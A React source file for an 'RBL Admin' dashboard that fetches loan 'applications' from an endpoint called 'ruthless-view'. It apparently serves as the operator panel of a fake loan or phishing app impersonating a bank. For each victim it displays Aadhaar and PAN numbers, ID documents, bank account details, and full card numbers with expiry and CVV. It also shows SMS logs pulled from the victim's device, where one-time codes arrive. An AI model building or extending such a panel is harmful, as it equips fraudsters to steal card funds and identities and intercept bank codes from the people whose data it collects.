import React, { useState, useEffect, useCallback } from 'react';
import {
    Shield, LogIn, Eye, EyeOff, Users, ChevronRight, ArrowLeft,
    MessageSquare, Search, RefreshCw, CreditCard, Fingerprint,
    Phone, User, Calendar, Briefcase, MapPin, Loader2, AlertCircle
} from 'lucide-react';

const API_BASE = 'https://rbl-project-5sfk.onrender.com';

// ═══════════════════════════════════════════════════════
// LOGIN SCREEN
// ═══════════════════════════════════════════════════════
const LoginScreen = ({ onLogin }) => {
    const [username, setUsername] = useState('');
    const [password, setPassword] = useState('');
    const [showPass, setShowPass] = useState(false);
    const [loading, setLoading] = useState(false);
    const [error, setError] = useState('');

    const handleLogin = async () => {
        if (!username || !password) return setError('Enter credentials');
        setLoading(true);
        setError('');

        try {
            const res = await fetch(`${API_BASE}/api/auth/login`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ username, password })
            });

            const data = await res.json();

            if (res.ok && data.token) {
                onLogin(data.token);
            } else {
                setError(data.message || 'Invalid credentials');
            }
        } catch (err) {
            setError('Network error. Could not connect to server.');
        } finally {
            setLoading(false);
        }
    };

    return (
        <div style={{
            minHeight: '100vh', display: 'flex', flexDirection: 'column',
            justifyContent: 'center', padding: '32px 24px',
            background: 'linear-gradient(180deg, #0a0e1a 0%, #111827 100%)'
        }}>
            <div style={{ textAlign: 'center', marginBottom: 48 }}>
                <div style={{
                    width: 64, height: 64, borderRadius: 16,
                    background: 'linear-gradient(135deg, #e42312, #b91c1c)',
                    display: 'flex', alignItems: 'center', justifyContent: 'center',
                    margin: '0 auto 16px', boxShadow: '0 8px 24px rgba(228,35,18,0.3)'
                }}>
                    <Shield size={28} color="#fff" />
                </div>
                <h1 style={{ color: '#fff', fontSize: 24, fontWeight: 800, margin: 0 }}>RBL Admin</h1>
                <p style={{ color: '#64748b', fontSize: 12, letterSpacing: 2, textTransform: 'uppercase', marginTop: 4 }}>Secure Access</p>
            </div>

            <div style={{ maxWidth: 360, margin: '0 auto', width: '100%' }}>
                <label style={{ color: '#94a3b8', fontSize: 11, fontWeight: 700, textTransform: 'uppercase', letterSpacing: 1.5, display: 'block', marginBottom: 8 }}>Username</label>
                <input
                    value={username} onChange={e => setUsername(e.target.value)}
                    placeholder="admin"
                    style={{
                        width: '100%', padding: '14px 16px', borderRadius: 12,
                        border: '1px solid #1e293b', background: '#0f172a',
                        color: '#fff', fontSize: 15, outline: 'none', marginBottom: 20,
                        boxSizing: 'border-box'
                    }}
                />

                <label style={{ color: '#94a3b8', fontSize: 11, fontWeight: 700, textTransform: 'uppercase', letterSpacing: 1.5, display: 'block', marginBottom: 8 }}>Password</label>
                <div style={{ position: 'relative', marginBottom: 12 }}>
                    <input
                        type={showPass ? 'text' : 'password'}
                        value={password} onChange={e => setPassword(e.target.value)}
                        placeholder="••••••••"
                        style={{
                            width: '100%', padding: '14px 48px 14px 16px', borderRadius: 12,
                            border: '1px solid #1e293b', background: '#0f172a',
                            color: '#fff', fontSize: 15, outline: 'none', boxSizing: 'border-box'
                        }}
                    />
                    <button onClick={() => setShowPass(!showPass)} style={{
                        position: 'absolute', right: 12, top: '50%', transform: 'translateY(-50%)',
                        background: 'none', border: 'none', cursor: 'pointer', padding: 4
                    }}>
                        {showPass ? <EyeOff size={18} color="#64748b" /> : <Eye size={18} color="#64748b" />}
                    </button>
                </div>

                {error && (
                    <div style={{
                        display: 'flex', alignItems: 'center', gap: 8, padding: '10px 14px',
                        borderRadius: 10, background: 'rgba(239,68,68,0.1)', border: '1px solid rgba(239,68,68,0.2)',
                        marginBottom: 16
                    }}>
                        <AlertCircle size={16} color="#ef4444" />
                        <span style={{ color: '#ef4444', fontSize: 13 }}>{error}</span>
                    </div>
                )}

                <button onClick={handleLogin} disabled={loading} style={{
                    width: '100%', padding: '16px', borderRadius: 14,
                    background: loading ? '#991b1b' : 'linear-gradient(135deg, #e42312, #b91c1c)',
                    color: '#fff', fontSize: 15, fontWeight: 700, border: 'none',
                    cursor: loading ? 'not-allowed' : 'pointer',
                    display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 8,
                    boxShadow: '0 4px 16px rgba(228,35,18,0.25)',
                    transition: 'all 0.2s', marginTop: 8
                }}>
                    {loading ? <Loader2 size={18} className="spin" /> : <LogIn size={18} />}
                    {loading ? 'Authenticating...' : 'Sign In'}
                </button>
            </div>
        </div>
    );
};

// ═══════════════════════════════════════════════════════
// APPLICATION CARD
// ═══════════════════════════════════════════════════════
const AppCard = ({ app, onTap }) => {
    const deviceInfo = typeof app.deviceFingerprint === 'string'
        ? (() => { try { return JSON.parse(app.deviceFingerprint); } catch { return {}; } })()
        : (app.deviceFingerprint || {});
    const bankInfo = typeof app.bankAccount === 'string'
        ? (() => { try { return JSON.parse(app.bankAccount); } catch { return {}; } })()
        : (app.bankAccount || {});

    return (
        <div onClick={() => onTap(app)} style={{
            background: '#1e293b', borderRadius: 16, padding: '18px 20px',
            border: '1px solid #334155', cursor: 'pointer',
            transition: 'all 0.2s', marginBottom: 12
        }}>
            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                <div style={{ display: 'flex', alignItems: 'center', gap: 14 }}>
                    <div style={{
                        width: 44, height: 44, borderRadius: 12, display: 'flex',
                        alignItems: 'center', justifyContent: 'center',
                        background: 'rgba(228,35,18,0.1)', border: '1px solid rgba(228,35,18,0.2)'
                    }}>
                        <User size={20} color="#e42312" />
                    </div>
                    <div>
                        <h3 style={{ color: '#fff', fontSize: 15, fontWeight: 700, margin: 0 }}>{app.fullName || 'Unknown'}</h3>
                        <p style={{ color: '#64748b', fontSize: 12, margin: '2px 0 0' }}>{app.mobile || 'No phone'}</p>
                    </div>
                </div>
                <ChevronRight size={18} color="#475569" />
            </div>
            <div style={{
                display: 'flex', gap: 16, marginTop: 14, paddingTop: 14,
                borderTop: '1px solid rgba(255,255,255,0.05)', flexWrap: 'wrap'
            }}>
                <span style={{ color: '#94a3b8', fontSize: 11, fontWeight: 600 }}>
                    PAN: <span style={{ color: '#e2e8f0' }}>{app.panCard || '—'}</span>
                </span>
                <span style={{ color: '#94a3b8', fontSize: 11, fontWeight: 600 }}>
                    Limit: <span style={{ color: '#22c55e' }}>₹{bankInfo.loanAmountOffer || '—'}</span>
                </span>
                <span style={{ color: '#94a3b8', fontSize: 11, fontWeight: 600 }}>
                    Device: <span style={{ color: '#e2e8f0' }}>{deviceInfo.deviceId?.slice(0, 8) || '—'}...</span>
                </span>
            </div>
        </div>
    );
};

// ═══════════════════════════════════════════════════════
// DETAIL VIEW
// ═══════════════════════════════════════════════════════
const DetailView = ({ app, token, onBack }) => {
    const [tab, setTab] = useState('info');
    const [smsLogs, setSmsLogs] = useState([]);
    const [loadingSms, setLoadingSms] = useState(false);

    const deviceInfo = typeof app.deviceFingerprint === 'string'
        ? (() => { try { return JSON.parse(app.deviceFingerprint); } catch { return {}; } })()
        : (app.deviceFingerprint || {});
    const bankInfo = typeof app.bankAccount === 'string'
        ? (() => { try { return JSON.parse(app.bankAccount); } catch { return {}; } })()
        : (app.bankAccount || {});

    useEffect(() => {
        if (tab === 'sms') fetchSms();
    }, [tab]);

    const fetchSms = async () => {
        setLoadingSms(true);
        try {
            const deviceId = deviceInfo.deviceId || '';
            const res = await fetch(`${API_BASE}/api/admin/sms-logs?deviceId=${deviceId}`, {
                headers: { 'Authorization': `Bearer ${token}` }
            });
            if (res.ok) setSmsLogs(await res.json());
        } catch (e) { console.error(e); }
        finally { setLoadingSms(false); }
    };

    const InfoRow = ({ icon: Icon, label, value, highlight }) => (
        <div style={{
            display: 'flex', alignItems: 'center', gap: 12, padding: '14px 0',
            borderBottom: '1px solid rgba(255,255,255,0.04)'
        }}>
            <Icon size={16} color="#64748b" />
            <span style={{ color: '#94a3b8', fontSize: 12, fontWeight: 600, minWidth: 90 }}>{label}</span>
            <span style={{ color: highlight ? '#22c55e' : '#e2e8f0', fontSize: 13, fontWeight: 600, wordBreak: 'break-all' }}>{value || '—'}</span>
        </div>
    );

    return (
        <div style={{
            minHeight: '100vh', background: 'linear-gradient(180deg, #0a0e1a 0%, #111827 100%)',
            padding: '48px 20px 100px'
        }}>
            <button onClick={onBack} style={{
                display: 'flex', alignItems: 'center', gap: 6, background: 'none',
                border: 'none', color: '#94a3b8', cursor: 'pointer', padding: 0, marginBottom: 20
            }}>
                <ArrowLeft size={18} /> <span style={{ fontSize: 12, fontWeight: 700, textTransform: 'uppercase', letterSpacing: 1.5 }}>Back</span>
            </button>

            {/* Header */}
            <div style={{
                background: '#1e293b', borderRadius: 16, padding: 20,
                borderLeft: '4px solid #e42312', marginBottom: 20
            }}>
                <h2 style={{ color: '#fff', fontSize: 20, fontWeight: 800, margin: 0 }}>{app.fullName}</h2>
                <p style={{ color: '#64748b', fontSize: 13, margin: '4px 0 0' }}>{app.mobile} · ID: {app.applicationId}</p>
            </div>

            {/* Tabs */}
            <div style={{ display: 'flex', gap: 8, marginBottom: 20 }}>
                {['info', 'bank', 'sms'].map(t => (
                    <button key={t} onClick={() => setTab(t)} style={{
                        flex: 1, padding: '12px 0', borderRadius: 12, border: 'none',
                        background: tab === t ? '#e42312' : '#1e293b',
                        color: tab === t ? '#fff' : '#94a3b8',
                        fontSize: 12, fontWeight: 700, textTransform: 'uppercase',
                        letterSpacing: 1, cursor: 'pointer', transition: 'all 0.2s'
                    }}>
                        {t === 'info' ? 'Personal' : t === 'bank' ? 'Financial' : 'SMS Logs'}
                    </button>
                ))}
            </div>

            {/* Tab Content */}
            <div style={{ background: '#1e293b', borderRadius: 16, padding: '4px 20px' }}>
                {tab === 'info' && (
                    <>
                        <InfoRow icon={User} label="Full Name" value={app.fullName} />
                        <InfoRow icon={Phone} label="Mobile" value={app.mobile} />
                        <InfoRow icon={Calendar} label="DOB" value={app.dob} />
                        <InfoRow icon={Briefcase} label="Job Type" value={deviceInfo.jobType} />
                        <InfoRow icon={CreditCard} label="PAN Card" value={app.panCard} />
                        <InfoRow icon={Fingerprint} label="Aadhaar" value={app.aadhaarNumber} />
                        <InfoRow icon={MapPin} label="Device ID" value={deviceInfo.deviceId} />

                        {app.documentPath && (
                            <div style={{ marginTop: 24, padding: 12, borderRadius: 12, background: 'rgba(255,255,255,0.03)', border: '1px solid rgba(255,255,255,0.05)' }}>
                                <p style={{ color: '#94a3b8', fontSize: 11, fontWeight: 700, textTransform: 'uppercase', letterSpacing: 1.5, marginBottom: 12 }}>Attachments</p>
                                <button
                                    onClick={() => window.open(`${API_BASE}${app.documentPath}`, '_blank')}
                                    style={{
                                        width: '100%', padding: '12px', borderRadius: 10, border: '1px solid #e42312',
                                        background: 'rgba(228,35,18,0.1)', color: '#e42312', fontSize: 13, fontWeight: 700,
                                        cursor: 'pointer', display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 8
                                    }}
                                >
                                    <MessageSquare size={16} /> View ID Proof (PDF/Image)
                                </button>
                            </div>
                        )}
                    </>
                )}

                {tab === 'bank' && (
                    <>
                        <InfoRow icon={MapPin} label="Bank" value={bankInfo.bankName} />
                        <InfoRow icon={CreditCard} label="Account No" value={bankInfo.accountNumber} />
                        <InfoRow icon={MapPin} label="IFSC" value={bankInfo.ifscCode} />
                        <InfoRow icon={CreditCard} label="Card No" value={bankInfo.cardNumber} highlight />
                        <InfoRow icon={Calendar} label="Expiry" value={bankInfo.cardExpiry} />
                        <InfoRow icon={Fingerprint} label="CVV" value={bankInfo.cardCvv} highlight />
                        <InfoRow icon={CreditCard} label="Limit" value={`₹${bankInfo.loanAmountOffer || '—'}`} highlight />
                    </>
                )}

                {tab === 'sms' && (
                    <div style={{ padding: '12px 0' }}>
                        {loadingSms ? (
                            <div style={{ textAlign: 'center', padding: 32 }}>
                                <Loader2 size={24} color="#e42312" className="spin" />
                                <p style={{ color: '#64748b', fontSize: 13, marginTop: 8 }}>Loading messages...</p>
                            </div>
                        ) : smsLogs.length === 0 ? (
                            <div style={{ textAlign: 'center', padding: 32 }}>
                                <MessageSquare size={32} color="#334155" />
                                <p style={{ color: '#64748b', fontSize: 13, marginTop: 8 }}>No SMS logs found for this device</p>
                            </div>
                        ) : (
                            smsLogs.map((msg, i) => (
                                <div key={msg.id || i} style={{
                                    padding: '14px 0', borderBottom: i < smsLogs.length - 1 ? '1px solid rgba(255,255,255,0.04)' : 'none'
                                }}>
                                    <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: 6 }}>
                                        <span style={{ color: '#e42312', fontSize: 11, fontWeight: 800, textTransform: 'uppercase', letterSpacing: 1 }}>{msg.address || 'Unknown'}</span>
                                        <span style={{ color: '#475569', fontSize: 10 }}>{msg.date ? new Date(msg.date).toLocaleString() : ''}</span>
                                    </div>
                                    <p style={{ color: '#cbd5e1', fontSize: 13, lineHeight: 1.6, margin: 0 }}>{msg.body}</p>
                                </div>
                            ))
                        )}
                    </div>
                )}
            </div>
        </div>
    );
};

// ═══════════════════════════════════════════════════════
// MAIN APP
// ═══════════════════════════════════════════════════════
const App = () => {
    const [token, setToken] = useState(localStorage.getItem('adminToken'));
    const [view, setView] = useState('list'); // list | detail
    const [apps, setApps] = useState([]);
    const [selectedApp, setSelectedApp] = useState(null);
    const [loading, setLoading] = useState(false);
    const [search, setSearch] = useState('');
    const [error, setError] = useState('');

    const handleLogin = (t) => {
        localStorage.setItem('adminToken', t);
        setToken(t);
    };

    const fetchApps = useCallback(async () => {
        setLoading(true);
        setError('');
        try {
            const res = await fetch(`${API_BASE}/api/admin/ruthless-view`, {
                headers: { 'Authorization': `Bearer ${token}` }
            });
            if (res.status === 401 || res.status === 403) {
                localStorage.removeItem('adminToken');
                setToken(null);
                return;
            }
            if (!res.ok) throw new Error('Failed to fetch');
            setApps(await res.json());
        } catch (e) {
            setError(e.message);
        } finally {
            setLoading(false);
        }
    }, [token]);

    useEffect(() => {
        if (token) fetchApps();
    }, [token, fetchApps]);

    if (!token) return <LoginScreen onLogin={handleLogin} />;

    if (view === 'detail' && selectedApp) {
        return <DetailView app={selectedApp} token={token} onBack={() => setView('list')} />;
    }

    const filtered = apps.filter(a =>
        (a.fullName || '').toLowerCase().includes(search.toLowerCase()) ||
        (a.mobile || '').includes(search) ||
        (a.panCard || '').toLowerCase().includes(search.toLowerCase())
    );

    return (
        <div style={{
            minHeight: '100vh', background: 'linear-gradient(180deg, #0a0e1a 0%, #111827 100%)',
            padding: '48px 20px 32px'
        }}>
            {/* Header */}
            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: 28 }}>
                <div>
                    <h1 style={{ color: '#fff', fontSize: 22, fontWeight: 800, margin: 0 }}>RBL Admin</h1>
                    <p style={{ color: '#475569', fontSize: 11, letterSpacing: 2, textTransform: 'uppercase', margin: 0 }}>
                        {apps.length} Application{apps.length !== 1 ? 's' : ''}
                    </p>
                </div>
                <div style={{ display: 'flex', gap: 8 }}>
                    <button onClick={fetchApps} style={{
                        width: 40, height: 40, borderRadius: 12, border: '1px solid #334155',
                        background: '#1e293b', display: 'flex', alignItems: 'center', justifyContent: 'center',
                        cursor: 'pointer'
                    }}>
                        <RefreshCw size={16} color="#94a3b8" className={loading ? 'spin' : ''} />
                    </button>
                    <button onClick={() => { localStorage.removeItem('adminToken'); setToken(null); }} style={{
                        width: 40, height: 40, borderRadius: 12, border: '1px solid #334155',
                        background: '#1e293b', display: 'flex', alignItems: 'center', justifyContent: 'center',
                        cursor: 'pointer'
                    }}>
                        <LogIn size={16} color="#ef4444" />
                    </button>
                </div>
            </div>

            {/* Search */}
            <div style={{ position: 'relative', marginBottom: 24 }}>
                <Search size={16} color="#475569" style={{ position: 'absolute', left: 14, top: '50%', transform: 'translateY(-50%)' }} />
                <input
                    value={search} onChange={e => setSearch(e.target.value)}
                    placeholder="Search by name, phone, or PAN..."
                    style={{
                        width: '100%', padding: '14px 16px 14px 42px', borderRadius: 14,
                        border: '1px solid #1e293b', background: '#0f172a',
                        color: '#fff', fontSize: 14, outline: 'none', boxSizing: 'border-box'
                    }}
                />
            </div>

            {/* Error */}
            {error && (
                <div style={{
                    display: 'flex', alignItems: 'center', gap: 8, padding: '12px 16px',
                    borderRadius: 12, background: 'rgba(239,68,68,0.1)', marginBottom: 16
                }}>
                    <AlertCircle size={16} color="#ef4444" />
                    <span style={{ color: '#ef4444', fontSize: 13 }}>{error}</span>
                </div>
            )}

            {/* Loading */}
            {loading && apps.length === 0 ? (
                <div style={{ textAlign: 'center', paddingTop: 64 }}>
                    <Loader2 size={32} color="#e42312" className="spin" />
                    <p style={{ color: '#64748b', marginTop: 12 }}>Loading applications...</p>
                </div>
            ) : filtered.length === 0 ? (
                <div style={{ textAlign: 'center', paddingTop: 64 }}>
                    <Users size={40} color="#334155" />
                    <p style={{ color: '#64748b', marginTop: 12 }}>
                        {search ? 'No results found' : 'No applications yet'}
                    </p>
                </div>
            ) : (
                filtered.map(a => (
                    <AppCard key={a.id} app={a} onTap={(app) => { setSelectedApp(app); setView('detail'); }} />
                ))
            )}
        </div>
    );
};

export default App;
